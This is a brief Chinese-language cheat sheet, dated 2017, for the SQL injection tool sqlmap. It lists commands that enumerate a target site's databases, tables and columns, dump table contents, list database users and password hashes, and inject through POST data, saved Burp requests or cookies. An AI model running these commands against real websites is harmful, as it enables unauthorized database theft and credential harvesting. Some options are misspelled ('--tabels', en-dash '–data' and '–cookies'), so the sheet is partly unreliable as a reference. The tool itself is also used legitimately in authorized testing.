# sqlmap简略方法

```r
python  sqlmap.py  -u  http://hello.com?id=1  --dbs   # 数据库
..  -D hello_db --tabels			 # 表名
..  -D hello_db -T hello_tbl --columns          # 字段名
..  -D hello_db -T hello_tbl -C hello_col --dump         # 脱库

--current-db    # 当前数据库
--current-user  # 当前用户

--users     # 枚举用户
--password  # 枚举用户密码

–data "name=admin"    post数据
-r  某个请求文件（由burp保存）  post注入
–cookies="PHPSESSID=mvij; security=low"     # cookie注入
–threads 3    # 多线程，最大是10

-p  # 指定参数


--dump可以直接用
```


2017/9/2  
